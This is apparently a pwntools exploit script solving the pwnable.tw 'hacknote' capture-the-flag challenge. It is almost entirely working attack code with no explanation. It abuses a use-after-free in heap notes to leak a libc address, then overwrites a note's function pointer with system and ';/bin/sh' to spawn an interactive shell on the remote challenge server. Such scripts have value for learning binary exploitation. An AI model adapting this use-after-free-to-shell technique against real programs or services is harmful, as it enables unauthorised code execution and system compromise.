#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./hacknote')
	bin = ELF('./hacknote')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10102)
	bin = ELF('./hacknote')
	libc = ELF('./libc_32.so.6')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def add(size,con):
	cn.sendline('1')
	cn.recvuntil('Note size :')
	cn.sendline(str(size))
	cn.recvuntil('Content :')
	cn.send(con)

def dele(idx):
	cn.sendline('2')
	cn.recvuntil("Index :")
	cn.sendline(str(idx))

def show(idx):
	cn.sendline('3')
	cn.recvuntil("Index :")
	cn.sendline(str(idx))


add(0x80,'a')#0
add(0x80,'a')#1
dele(0)

add(0x80,'X')#2
show(2)

cn.recvuntil('X')

cn.recv(3)
if local:
	libc.address = u32(cn.recv(4))-48-0x1b2780
else:
	libc.address = u32(cn.recv(4))-48-0x001B0780
success('libc_base: '+hex(libc.address))
system = libc.sym['system']
dele(0)
dele(1)

pay = p32(system)+';/bin/sh\x00'
add(0x90,pay)
#z('b*0x08048923\nc')

show(0)

cn.interactive()